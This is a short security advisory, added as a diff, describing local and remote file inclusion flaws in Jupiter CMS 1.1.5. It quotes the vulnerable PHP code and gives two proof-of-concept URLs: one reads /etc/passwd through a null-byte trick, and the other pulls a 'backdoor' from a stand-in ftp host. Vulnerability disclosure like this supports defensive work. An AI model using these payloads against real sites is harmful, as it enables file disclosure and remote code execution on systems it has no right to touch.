@@ -1,0 +1,33 @@
+Title:          Jupiter CMS 1.1.5 Multiple Vulnerabilities
+Advisory ID:    12070214
+Risk level:     High
+Author:         DarkFig <gmdarkfig@gmail.com>
+URL:            http://www.acid-root.new.fr/advisories/12070214.txt
+
+Risk level: High
+Summary:    Local/Remote File Inclusion
+Conditions: LFI: magic_quotes_gpc = Off
+            RFI: PHP >= 5.0.0, allow_url_fopen = On
+
+The script "index.php" contains the following code:
+
+if(isset($n))
+{
+  if(file_exists("$n.php"))
+  {
+    if(strpos($n, "../") !== false) header("location: $PHP_SELF?i=error");
+    else include("$n.php");
+  }
+  elseif(!file_exists("$n.php")) header("location: $PHP_SELF?i=error");
+}
+
+The "n" parameter isn't properly filtered, this can lead to file inclusion.
+Local file inclusion will work if magic_quotes_gpc=Off, the null byte char \x00
+is required. Remote file inclusion will work if the server is running on PHP >= 5.
+In this version, the file_exists() function can be used with some URL wrappers,
+you can use ftp:// for example. Simple poc:
+
+LFI: http://<host><path>/index.php?n=/etc/passwd%00
+RFI: http://<host><path>/index.php?n=ftp://user:password@example.com/backdoor
+
+# milw0rm.com [2007-02-14]
